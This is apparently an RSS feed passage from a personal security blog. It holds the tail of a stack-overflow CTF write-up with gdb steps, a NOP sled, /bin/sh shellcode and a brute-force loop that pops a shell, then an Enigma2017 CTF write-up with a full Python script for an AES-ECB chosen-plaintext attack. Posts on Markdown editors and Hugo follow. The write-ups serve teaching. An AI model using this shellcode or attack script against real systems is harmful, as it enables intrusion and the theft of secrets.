&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;)
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that EIP is 0xff881111. Maybe it doesn&#39;t point into the stack on THIS run but it sometimes will, which is all we need, since we&#39;re allowed to retry the attack until it does.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Putting it all together:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Store a NOP sled of 0x90 bytes and the shellcode at the end, in the stack via an env. var.:
$ export SHELLCODE=$(python -c &#39;print &amp;quot;\x90&amp;quot;*100000 + &amp;quot;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&amp;quot;&#39;)

# Point to the stack, and keep running the attack until it works: the ol&#39; &amp;quot;spray &amp;amp; pray&amp;quot;
$ for i in {1..100}; do ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;); done

# Boom, it pops a shell:
$ ls
key  overflowme  overflowme.c                                                  
$ cat key
bb379544581fa2b010d958d6e78addfa
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Enigma2017 CTF Broken Encryption Writeup</title>
      <link>https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/</link>
      <pubDate>Sun, 12 Feb 2017 13:40:38 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/</guid>
      <description>

&lt;p&gt;There is a new &amp;ldquo;Jeopardy style&amp;rdquo; security CTF web framework (CTF-as-a-Service?) called &lt;a href=&#34;http://hackcenter.com/&#34;&gt;HackCenter&lt;/a&gt; that just debuted from For All Secure, the CMU-affiliated security startup known for &lt;a href=&#34;https://www.defense.gov/News/Article/Article/906931/three-teams-earn-prizes-in-darpa-cyber-grand-challenge&#34;&gt;winning last year&amp;rsquo;s DARPA Cyber Grand Challenge Final Event&lt;/a&gt; with their game-playing &amp;ldquo;automated exploit generation&amp;rdquo; system they called Mayhem CRS. HackCenter is their &amp;ldquo;other&amp;rdquo; technology, I guess, and right now the only CTF they&amp;rsquo;ve hosted is/was the one that occurred at &lt;a href=&#34;https://www.usenix.org/conference/enigma2017&#34;&gt;Enigma2017 USENIX&lt;/a&gt; conference at the end of January. It seemed to be marketed as educational: &amp;ldquo;learn to hack!&amp;rdquo; and not as unfriendly and elitist as some of the more competitive CTFs, so I gave it a look. Also, this was a chance to refresh myself on some Python.&lt;/p&gt;

&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;They give us a telnet server that prompts us to send whatever string we want, and then it sends back an encrypted version of that string. Also they give us this source code for the server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python -u
from Crypto.Cipher import AES

flag = open(&amp;quot;flag&amp;quot;, &amp;quot;r&amp;quot;).read().strip()
key = open(&#39;enc_key&#39;, &#39;r&#39;).read().strip().decode(&#39;hex&#39;)

welcome = &amp;quot;&amp;quot;&amp;quot;
************ MI6 Secure Encryption Service ************
                  [We&#39;re super secure]
       ________   ________    _________  ____________;_
      - ______ \ - ______ \ / _____   //.  .  ._______/ 
     / /     / // /     / //_/     / // ___   /
    / /     / // /     / /       .-&#39;//_/|_/,-&#39;
   / /     / // /     / /     .-&#39;.-&#39;
  / /     / // /     / /     / /
 / /     / // /     / /     / /
/ /_____/ // /_____/ /     / /
\________- \________-     /_/

&amp;quot;&amp;quot;&amp;quot;

def pad(m):
  m = m + &#39;1&#39;
  while len(m) % 16 != 0:
    m = m + &#39;0&#39;
  return m

def encrypt():
  cipher = AES.new(key,AES.MODE_ECB)

  m = raw_input(&amp;quot;Agent number: &amp;quot;)
  m = &amp;quot;agent &amp;quot; + m + &amp;quot; wants to see &amp;quot; + flag

  return cipher.encrypt(pad(m)).encode(&amp;quot;hex&amp;quot;)

print welcome
print encrypt()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We also get a web shell on hackcenter.com: literally an in-browser terminal emulator connected to the remote server (we do not have read access to the directory with &amp;ldquo;flag&amp;rdquo;), but for this problem we will just open our local Terminal app and poke around.&lt;/p&gt;

&lt;h2 id=&#34;anything-ecb-is-bad-mmmkay&#34;&gt;Anything ECB is Bad Mmmkay&lt;/h2&gt;

&lt;p&gt;Look at the source: basically, &lt;code&gt;&amp;quot;agent &amp;quot; + yourinput + &amp;quot; wants to see &amp;quot; + flag&lt;/code&gt; is padded out to the next nearest AES block length (128 bits == 16 bytes) and then encrypted with AES-ECB using whatever the key is. Now, basically the first thing you learn about block ciphers is to never use the Electronic Code Book (ECB) mode. You&amp;rsquo;ll see a photo of Tux the Linux mascot encrypted with AES-ECB and how you can still see the edges of the image in the encrypted version. But that&amp;rsquo;s about it. It&amp;rsquo;s rare to see an explanation of why this is relevant or how to break it. Just, &amp;ldquo;everyone knows it&amp;rsquo;s bad.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;The reason why ECB mode of any block cipher is bad is that the same input always encrypts to the same output. The input is broken into fixed-length blocks and encrypted, and all of the blocks of identical input will create similarly equal output blocks. The data is all encrypted, but we know where their plaintexts were the same. There is &lt;em&gt;no key recovery attack against this issue&lt;/em&gt;, at least not that I am aware of, but the problem is that the plaintext can be guessed. There are two basic attacks against ECB:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Given enough encrypted blocks and some partial knowledge of the plaintext (known offsets of fixed data, like as defined by filetype formats or communication protocols), statistical and frequency analysis (and some guessing, then confirming) can reveal partial plaintext.&lt;/li&gt;
&lt;li&gt;Given the ability to prefix or circumfix (that means insert in the middle somewhere) arbitrary plaintext, and then have it encrypted and view the resulting ciphertext, an attacker can stage what cryptographers call a Chosen Plaintext Attack (CPA). The scenario of passing arbitrary plaintext to a remote encryptor and receiving the ciphertext back is also called an &lt;a href=&#34;https://en.wikipedia.org/wiki/Oracle_machine#Applications_to_cryptography&#34;&gt;Oracle&lt;/a&gt;. This is the attack we will discuss in this post.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The reason why this is &lt;em&gt;relevant&lt;/em&gt; is that to the average programmer who can&amp;rsquo;t be bothered, ECB looks like a valid mode choice for AES, a cipher that people generally recommend: &amp;ldquo;military grade crypto,&amp;rdquo; right? They might use it to encrypt the cookie their web site stores in your browser. Or if they&amp;rsquo;re especially ignorant in security like the people who work at Adobe, &lt;a href=&#34;https://arstechnica.com/security/2013/11/how-an-epic-blunder-by-adobe-could-strengthen-hand-of-password-crackers/&#34;&gt;they might use it to encrypt their users&amp;rsquo; passwords on the server&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;breaking-ecb-with-the-chosen-plaintext-attack&#34;&gt;Breaking ECB with the Chosen Plaintext Attack&lt;/h2&gt;

&lt;p&gt;Being able to circumfix our arbitrary input into the plaintext (at a known location in that string) means that we can choose an input such that we can fully align &lt;em&gt;our&lt;/em&gt; &lt;em&gt;known&lt;/em&gt; &lt;em&gt;substring&lt;/em&gt; on an AES block boundary. Thus allowing us to test what the ciphertext is for any arbitrary block that we choose.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot;agent &amp;quot; + yourinput + &amp;quot; wants to see &amp;quot; + flag + padding
(6 chars)  (n chars)    (14 chars)   &amp;lt;—- if you want to test-encrypt a single block of arbitrary input, put your test input on a 16-byte block boundary, like so: yourinput = &amp;quot;01234567891000000000000000&amp;quot;. &amp;quot;1000000000000000&amp;quot; is at bytes 16 through 31 of the input, aka the second AES (128-bit, 16-byte) block.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We don&amp;rsquo;t know how long the flag is, but we know how the padding is applied: if the plaintext message does not end on a 16-byte boundary, then it is extended by a single &amp;ldquo;1&amp;rdquo; and up to 14 &amp;ldquo;0&amp;rdquo; characters. If the plaintext message &lt;em&gt;does&lt;/em&gt; end on a 16-byte boundary, then it is extended by a full block of padding: &lt;code&gt;1000000000000000&lt;/code&gt;. This may seem counter-intuitive, but there always has to be padding in a block cipher, even when the message length already is a multiple of the block length: otherwise how would you know if the last block is padding or if &lt;code&gt;1000000000000000&lt;/code&gt; was part of the message?&lt;/p&gt;

&lt;p&gt;See where we&amp;rsquo;re going with this? We will give the above plaintext, and observe the output&amp;rsquo;s 2nd block. That is the exact same output we would expect to see as the last block of ciphertext if the flag ends at a block boundary and the final block were AES padding.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Agent number: 01234567891000000000000000
ceaa6fa24a71971f21413c1ea39f4e7c53b1c1d36d11a2c20dfc3913bb299f11c9777890922460e74fefb1a94f5c95df0ebb6d7bc5a7922f0857283feb2b068dc5148be36b7670e2ca4fe52c3f65c37612b88acbe4bbd5a9f2588bbc4e0ea92453b1c1d36d11a2c20dfc3913bb299f11
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note the second block (32 hex characters = 16 bytes) of ciphertext is &lt;code&gt;53b1c1d36d11a2c20dfc3913bb299f11c&lt;/code&gt; and, through a stroke of luck, we&amp;rsquo;ve already aligned the overall message on a block boundary too, as we see &lt;code&gt;53b1c1d36d11a2c20dfc3913bb299f11c&lt;/code&gt; is also the last block of ciphertext!&lt;/p&gt;

&lt;p&gt;The game now is to insert one &lt;em&gt;additional&lt;/em&gt; byte of arbitray text in order to push a single byte of the &amp;ldquo;flag&amp;rdquo; portion of the string rightward into the padding block. The final padding block will be &lt;code&gt;n100000000000000&lt;/code&gt; where &lt;code&gt;n&lt;/code&gt; is the unknown byte of flag.&lt;/p&gt;

&lt;p&gt;What will we do then to guess that byte? We&amp;rsquo;ll brute-force it: send new plaintext messages for all 255 possibilities of &lt;code&gt;n&lt;/code&gt; in our block-aligned arbitrary input (which is the 2nd block). When the ciphertext&amp;rsquo;s 2nd block matches the ciphertext&amp;rsquo;s 7th block, then we know we guessed correctly. Then we&amp;rsquo;ll insert one additional byte again at the same location, and repeat this process. In other words, we expect to send a series of messages like the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0123456789a100000000000000
0123456789b100000000000000
0123456789c100000000000000
0123456789d100000000000000
0123456789e100000000000000 ... let&#39;s say that ciphertext blocks 2 and 7 match at this point!
0123456789ae10000000000000
0123456789be10000000000000
0123456789ce10000000000000
0123456789de10000000000000
0123456789ee10000000000000
0123456789fe10000000000000 ... they match again. We so far know last block = fe10000000000000
0123456789afe1000000000000
0123456789bfe1000000000000
and so on, and so on... up to 255 guesses per byte and as many bytes as we need to discover
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In practical terms, we can try guessing only in the ASCII range of 0x20-0x7E or so, since we expect the secret in this case to be plaintext (the &amp;ldquo;flag&amp;rdquo;). This will speed things up by more than double.&lt;/p&gt;

&lt;h2 id=&#34;putting-it-all-togther-a-solution-in-python&#34;&gt;Putting it All Togther: A Solution in Python&lt;/h2&gt;

&lt;p&gt;Knowing what to do is half the battle. The other half is coding it up and tearing your hair out over data alignment issues and dynamic typing issues.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Enigma2017 CTF, &amp;quot;Broken Encryption&amp;quot;

import sys
import time       # for using a delay in network connections
import telnetlib  # don&#39;t try using raw sockets, you&#39;ll tear your hair out trying to send the right line feed character

__author__ = &#39;michael-myers&#39;

# TODO: I&#39;m interested in any more elegant way to block-slice a Python string like this.
# Split out every 16-byte (32-hex char) block of returned ciphertext:
def parse_challenge(challenge):
    ciphertext_blocks = [challenge[0:32], challenge[32:64], challenge[64:96],
                         challenge[96:128], challenge[128:160], challenge[160:192],
                         challenge[192:224], challenge[224:]]
    return ciphertext_blocks


# To attack AES-ECB, we will be exploiting the following facts:
#   * we do not know all of the plaintext but we control a substring of it.
#	* the controlled portion is at a known offset within the string.
#   * by varying our input length we can force the secret part onto a block boundary.
#   * we can choose our substring to be a full block of padding &amp;amp; align it at a boundary.
#   * if the message ends at a block boundary, the last 16-byte block will be all padding.
#   * thus we know when the secret part is block aligned; we&#39;ll see the same ciphertext.
#   * there is no nonce or IV or counter, so ciphertext is deterministic.
#   * by varying length of plaintext we can align the secret part such that there 
#		is only one unknown byte at a time being encrypted in the final block of output. 
#	* by varying one byte at a time, we can brute-force guess input blocks until we
#       match what we see in the final block, thus giving us one byte of the secret.
#   * we will limit our guesses to the ASCII range 0x20-0x7E for this particular challenge.
#
# Begin by changing the 2nd block of plaintext to n100000000000000, where n is a guess. 
# If the ciphertext[2nd block] == ciphertext[7th block] then the guess is correct,
# otherwise increment n.
def main():
    # If the Engima2017 servers are still up: enigma2017.hackcenter.com 7945
    if len(sys.argv) &amp;lt; 3:   # lol Python doesn&#39;t have an argc
        print &#39;Usage : python CTF-Challenge-Response.py hostname port&#39;
        sys.exit()
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    guessed_secret = &amp;quot;&amp;quot;

    # Our input pads to the end of the 1st block, then aligns a guess at block 2.
    # Because we need to constantly alter this value, we are making it a bytearray. 
    # Strings in Python are immutable and inappropriate to use for holding data.
    chosen_plaintext = bytearray(&amp;quot;0123456789&amp;quot; + &amp;quot;1000000000000000&amp;quot;)

    # Guess each byte of the secret, in succession, by manipulating the 2nd plaintext
    # block (bytes 10 through 26) and looking for a matched ciphertext in the final block:
    for secret_bytes_to_guess in range(0, 64):
        # Add in a new guessing byte at the appropriate position:
        chosen_plaintext.insert(10, &amp;quot;?&amp;quot;)

        # Guess over and over different values until we get this byte:
        for guessed_byte in range(0x20, 0x7E):  # this is the printable ASCII range.
            chosen_plaintext[10] = chr(guessed_byte)

            tn = telnetlib.Telnet(&amp;quot;enigma2017.hackcenter.com&amp;quot;, 7945)
            tn.read_until(&amp;quot;Agent number: &amp;quot;)

            # Telnet input MUST BE DELIVERED with a \r\n line ending. If you send
            # only the \n the remote end will silently error on your input and send back
            # partially incorrect ciphertext! Untold hours debugging that bullshit.
            # Here we carefully convert the bytearray to ASCII and then to a string type, 
            # or else telnetlib barfs because of the hell that is dynamic typing.
            send_string = str(chosen_plaintext.decode(&#39;ascii&#39;) + &amp;quot;\r\n&amp;quot;)
            tn.write(send_string)

            challenge = tn.read_all()
            tn.close()
            # time.sleep(0.5)   # (optional) rate-limit if you&#39;re worried about getting banned.

            ciphertext_blocks = parse_challenge(challenge)
            print &amp;quot;Currently guessing: &amp;quot; + chosen_plaintext[10:26]  # 2nd block holds the guess
            print &amp;quot;Chosen vs. final ciphertext blocks: &amp;quot; + ciphertext_blocks[1] + &amp;quot; &amp;lt;- ? -&amp;gt; &amp;quot; + ciphertext_blocks[6]

            # We&#39;re always guessing in the 2nd block and comparing result vs the 7th block:
            if ciphertext_blocks[1] == ciphertext_blocks[6]:
                print &amp;quot;Guessed a byte of the secret: &amp;quot; + chr(guessed_byte)
                guessed_secret = chr(guessed_byte) + guessed_secret
                break   # Finish the inner loop immediately, back up to the outer loop.

    print &amp;quot;All guessed bytes: &amp;quot; + guessed_secret

    print(&amp;quot;Done&amp;quot;)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And, after all of this, we uncover the flag: &lt;code&gt;54368eae12f64b2451cc234b0f327c7e_ECB_is_the_w0rst&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The markup language known as Markdown</title>
      <link>https://michael-myers.github.io/blog/post/markdown/</link>
      <pubDate>Sun, 05 Feb 2017 03:05:56 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/markdown/</guid>
      <description>

&lt;h2 id=&#34;what-it-is&#34;&gt;What it Is&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Markdown&#34;&gt;Markdown&lt;/a&gt; is a &lt;em&gt;lightweight markup language&lt;/em&gt; (as opposed to a &lt;strong&gt;heavyweight&lt;/strong&gt; one like HTML or LaTeX). If you&amp;rsquo;ve ever taken plain-text file notes and used an asterisk to represent a bullet point, or a line of dashes like an underline for a heading, then you&amp;rsquo;ve basically already written Markdown. Markdown is a natural-looking &amp;ldquo;syntax&amp;rdquo; that lets you turn text like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;## What it is
[Markdown](https://en.wikipedia.org/wiki/Markdown) is a *lightweight markup language* (as opposed to a **heavyweight** one like HTML or LaTeX).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;into the HTML+CSS page that you&amp;rsquo;re looking at right now. We&amp;rsquo;ve all known that annoying nerd who refuses to send HTML-formatted emails and insists on sending plain text peppered with slashes and asterisks instead of italics and bold? Yea, basically a guy like that turned it into a semi-official standard, and now instead of being imaginary italics and bold, it actually renders that way.&lt;/p&gt;

&lt;h2 id=&#34;why-not-just-write-in-html-directly&#34;&gt;Why Not Just Write in HTML Directly?&lt;/h2&gt;

&lt;p&gt;I think this is &lt;a href=&#34;http://brettterpstra.com/2011/08/31/why-markdown-a-two-minute-explanation/&#34;&gt;best explained by Brett Terpstra here&lt;/a&gt;. Basically, HTML sucks to work in, if you&amp;rsquo;re just trying to write some content. HTML is tedious, hard on the eyes, and error prone. If you want a site to look good at all, it also needs CSS, and that sucks even worse. Real people don&amp;rsquo;t want to work in either one, they just want to write prose and have it look good. For this, you can use Markdown as a standard format for your thoughts, and then let a static site generator (like Hugo) turn it into a web page. Be a writer, not a website developer, is the thinking.&lt;/p&gt;

&lt;h2 id=&#34;editors&#34;&gt;Editors&lt;/h2&gt;

&lt;p&gt;I went looking for the ideal text editor in which to edit Markdown files. Ideally I could find something that ran on both MacOS and Linux, just for consistency since I use both. But Markdown is a standard format so I would also settle for the best on each respective platform, even if I had to use two different editors.&lt;/p&gt;

&lt;p&gt;If there is one thing that gets reinvented most often, it&amp;rsquo;s text editors. Programmers love to re-solve their own nerd problems rather than tackle real-world problems, and one problem every programmer has is editing text. So there are about 500 choices of text editor at this point, but I narrowed it down to these 7 just on the basis of using them to edit Markdown.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;img/markdownEditors.png&#34; alt=&#34;MarkdownEditors&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If the job is programming, a text editor should have code-completion and syntax highlighting. But if the job is editing a markup language, WYSIWYG is the number one thing I care about. So you notice I am not even considering the Vims and Emacs of the world. The whole point of Markdown was to be easy: easy for a human to read in its raw state, easy to edit. But I guess I would take this sentiment a little bit further: why should I have to look at markup language at all? It&amp;rsquo;s 2017, shouldn&amp;rsquo;t I have an editor at least as good as WordPad from Windows 95? Of course, I want it to be able to flip back to the raw &amp;ldquo;source&amp;rdquo; markup when necessary, but most of the time I just want to edit it the way it&amp;rsquo;s going to look when I&amp;rsquo;m done.&lt;/p&gt;

&lt;p&gt;This is a surprisingly uncommon feature. It seems that most editors have adopted the two-view or split-window paradigm seen in editors for more complicated markup and typesetting languages like LaTeX. They present the raw Markdown source on the left, and the rendered version on the right. Booooo. The concept of Auto-save, on the other hand, is a ubiquitous feature nowadays. That&amp;rsquo;s great to see.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;TextNut&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Typora&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;HarooPad&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Quiver&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Atom&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Sublime&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Texts&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;WYSIWYG&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Easy to Use&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Both Mac &amp;amp; Linux&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Free / OSS&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No ($25)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No (Beta)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No ($10)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No ($70)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No ($20)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Auto-save&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Work Directly in .md&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No*&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No*&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Leaves TOML Intact&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Unknown&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;No&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;* = TextNut can open and edit a .md file, but the WYSIWYG aspect only works when it is &amp;ldquo;imported&amp;rdquo; to the proprietary format and edited there, then exported back to Markdown. Quiver has similar focus on Notes and a similar weakness in working in .md directly: basically it&amp;rsquo;s a less capable TextNut.&lt;/p&gt;

&lt;p&gt;I like &lt;a href=&#34;http://www.texts.io&#34;&gt;Texts&lt;/a&gt;, but it breaks the &amp;ldquo;front matter&amp;rdquo; on a Hugo post, so that&amp;rsquo;s a deal-breaker. &lt;a href=&#34;http://pad.haroopress.com&#34;&gt;HarooPad&lt;/a&gt;, besides having a lack of  documentation in English and development that has been dead for a couple of years, is pretty robust. If it could only offer WYSIWYG editing I think it would have been my choice.&lt;/p&gt;

&lt;p&gt;So the overall winner for me is &lt;a href=&#34;https://typora.io&#34;&gt;Typora&lt;/a&gt;. Eventually it will leave beta, and they&amp;rsquo;ll charge for it, but hopefully it&amp;rsquo;s something reasonable. Until then, it&amp;rsquo;s free!&lt;/p&gt;

&lt;h2 id=&#34;quicklook-for-md-files-macos&#34;&gt;QuickLook for .md Files (MacOS)&lt;/h2&gt;

&lt;p&gt;I am all about using QuickLook in MacOS. You just hit space bar on a file in Finder and you get a perfectly good read-only peek at the file. But it doesn&amp;rsquo;t handle Markdown (as plain text, let alone as a rendered view). Fortunately &lt;a href=&#34;https://github.com/toland/qlmarkdown/releases&#34;&gt;someone made a QuickLook generator&lt;/a&gt; you can install using Homebrew: &lt;code&gt;brew install Caskroom/cask/qlmarkdown&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now you&amp;rsquo;re ready to work with Markdown files!&lt;/p&gt;

&lt;h2 id=&#34;it-s-not-all-roses-though-behind-the-scenes-on-this-post&#34;&gt;It&amp;rsquo;s Not All Roses Though: Behind the Scenes on This Post&lt;/h2&gt;

&lt;p&gt;The rendering of your content doesn&amp;rsquo;t &lt;em&gt;always&lt;/em&gt; turn out the way you envisioned. When this happens, it&amp;rsquo;s either your Hugo theme, or the Markdown renderer that is to blame. Unfortunately, this might mean rolling up your sleeves and fixing CSS, as I had to do in order to get the table above to look decent. Hopefully this is a one-time thing. I had to go into the purehugo theme subdirectory, and edit &lt;code&gt;static/all.min.css&lt;/code&gt; within that.&lt;/p&gt;

&lt;p&gt;Secondly, when editing Markdown to embed an image from a local directory (as I&amp;rsquo;ve done above), Hugo requires you to put the files in &lt;code&gt;/static&lt;/code&gt; and then in the Markdown you specify a relative path &lt;em&gt;without&lt;/em&gt; a leading slash, such as &lt;code&gt;![MarkdownEditors](img/markdownEditors.png)&lt;/code&gt; (actual path of the image in the source tree is &lt;code&gt;/blog/static/img/markdownEditors.png&lt;/code&gt;) and Hugo will copy it to the publishdir during rendering. Because of this, you can&amp;rsquo;t actually see the image in your Markdown editor, which sucks, and your source tree will have two copies of the file, which also sucks.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hugo, the static site generator</title>
      <link>https://michael-myers.github.io/blog/post/hugo/</link>
      <pubDate>Fri, 03 Feb 2017 19:07:12 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/hugo/</guid>
      <description>

&lt;h2 id=&#34;hugo-a-static-site-generator&#34;&gt;Hugo, a Static Site Generator&lt;/h2&gt;

&lt;p&gt;In my last post, I covered the rationale behind using a static site generator. Static site generators are not just for creating blogs. They can also be used to create online resumes, company sites, online documentation, etc.&lt;/p&gt;

&lt;p&gt;The default choice for static site generator is Jekyll, which has the most support, but it&amp;rsquo;s troublesome to install and use. Hugo is a popular alternative that is easier to install, and faster to work with. It&amp;rsquo;s implemented in Golang, a.k.a. Go. This means it is written in a statically compiled language (The Best Kind) and is &lt;em&gt;completely dependency free.&lt;/em&gt; Dependency hell is the bane of my existence. It&amp;rsquo;s like work that you have to do before you can start working. Anyway, let&amp;rsquo;s look at how to get started.&lt;/p&gt;

&lt;h2 id=&#34;hugo-install-process-macos&#34;&gt;Hugo Install Process (MacOS)&lt;/h2&gt;

&lt;p&gt;This is so simple, and its simplicity is the reason why I went with Hugo after trying the more popular Jekyll, which was a mess.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;brew update &amp;amp;&amp;amp; brew install hugo
hugo new site myBlog
cd myBlog
